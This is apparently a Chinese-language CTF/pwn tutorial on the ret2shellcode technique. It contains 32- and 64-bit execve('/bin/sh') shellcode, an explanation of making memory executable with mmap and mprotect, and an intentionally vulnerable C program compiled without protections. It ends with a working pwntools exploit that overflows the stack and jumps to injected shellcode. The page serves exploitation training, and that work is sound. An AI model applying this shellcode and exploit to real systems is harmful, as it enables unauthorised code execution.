---
title: "ret2shellcode"
description: ""
lead: ""
date: 2023-03-30T20:20:50+08:00
lastmod: 2023-03-30T20:20:50+08:00
draft: false
images: []
menu:
  docs:
    parent: ""
    identifier: "ret2shellcode-0eaa929129ddb1f35b555655c3b77a72"
weight: 3
toc: true
---

## 0x01 介绍

### shellcode

ret2shellcode用到的知识也是系统调用，只不过和ret2syscall的区别在于后者是利用程序里已有的代码片段，而前者是需要自己写系统调用代码编译后注入到内存里，然后跳转到我们写入的地方来执行我们写入的代码，我们称这种代码为shellcode。这种题型的难点就在于shellcode编写，其他的和前面区别不大。最简单的shellcode即execve系统调用的写法为

1. 获取 `/bin/sh` 字符串地址
2. 将字符串地址赋值给第一个参数寄存器
3. 将第二三参数寄存器置零
4. 将系统调用号存入ax寄存器
5. 执行内陷指令

32位的汇编代码为

```c
push 0x0068732f
push 0x6e69622f    # "/bin/sh"字符串按照小端序压入到栈中
mov ebx, esp    # 当前栈顶即esp指向的是"/bin/sh"字符串，将esp的值即字符串指针赋值给ebx
xor ecx, ecx    # ecx置零
xor edx, edx    # edx置零
mov eax, 11    # 将execve系统调用号给eax
int 0x80    # 执行系统调用

```

64位的汇编代码为

```c
mov rax, 0x0068732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 59
syscall
```

值得注意的是64位不能直接将8个字节直接push进栈里，必须借助寄存器才可以将 `/bin/sh` 字符串压入栈中

### ret2shellcode

将汇编编译为机器码后注入到内存里即可。在此之前需要保存注入shellcode的地方有可执行权限，最常见的情况就是没有加 `NX` 保护，然后可以注入到堆栈、data段bss段。还有的情况就是使用mmap申请了一个有可执行权限的内存，例如

```c
char *p = mmap(0x10000, 0x1000, 7, 0x22, -1, 0)
```

第一个参数是申请内存开始的地址，第二个参数是申请的内存大小，需要为内存分页的倍数（4KB的倍数），第三个参数是内存权限，可读为1，可写为2，可执行为4，通过或运算可以知道可读可写可执行的值为7，0x22是 `MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED` ，代表这是一个私有的映射（别的进程不可访问），还是一个匿名映射（不和任何文件相关联），而且映射区域映射到指定的起始地址，第四个参数是文件描述符，如果是匿名映射，填-1即可，最后一个参数是指定要映射文件的偏移量，可以填0不用管

这样我们在0x10000地址处就有了一个可以写入执行shellcode的内存了

还有一种情况是通过mprotect更改内存区域的权限，例如

```c
mprotect(0x10000, 0x1000, 7)
```

第一个参数是你要修改内存区域的地址，第二个参数是区域的长度，也需要是内存分页的倍数，最后一个参数是权限，和mmap的权限一样。

值得注意的是mmap和mprotect都是有系统调用存在的

我们以最简单的没加 `NX` 保护的情况来讲

```c
#include<stdio.h>
char buf[0x50];

void run() {
    char name[0x10];
    printf("name: ");
    scanf("%s", name);
    printf("content: ");
    scanf("%s", buf);
}

int main() {
    run();
    return 0;
}
// gcc ret2shellcode.c -o ret2shellcode -m32 -no-pie -fno-pic -fno-stack-protector -z execstack

```

这里第一次输入存在栈溢出，而第二次输入是输入到buf中，buf是未初始化数组，保存在了bss段中，由于没有加PIE保护，所以buf地址是已知的，那么我们就可以将shellcode注入到buf中，然后覆盖函数返回地址为buf地址，即可通过ret跳转执行我们的shellcode

![6cd8d6f25ac6a5d65b1c8586e1d8cf23](images/6cd8d6f25ac6a5d65b1c8586e1d8cf23.png)  

这样我们就可以写出最终的Exploit

```c
from pwn import*
context.log_level = 'debug'    # 设置为调试模式
context.arch = 'i386'    # 设置系统架构，要不然编译汇编代码会出错
o = process("./ret2shellcode")
# 第一次输入，栈溢出覆盖函数返回地址为buf地址
payload = b'a'*28 + p32(0x804a040)
o.sendline(payload)

# execve("/bin/sh", 0, 0)
shellcode = '''
push 0x0068732f
push 0x6e69622f
push esp
pop ebx
xor ecx, ecx
xor edx, edx
mov eax, 59
xor eax, 48    # 由于11是scanf的截断字符，所以通过先将eax赋值为59，再将eax和48异或eax即可得到11 
int 0x80
'''
payload = asm(shellcode)    # 编译汇编代码
o.sendline(payload)    # 将编译好的机器码写入到buf中

o.interactive()

```

![ef435571032bf634b5d9a6dafac27beb](images/ef435571032bf634b5d9a6dafac27beb.png)  

建议调试看看具体过程
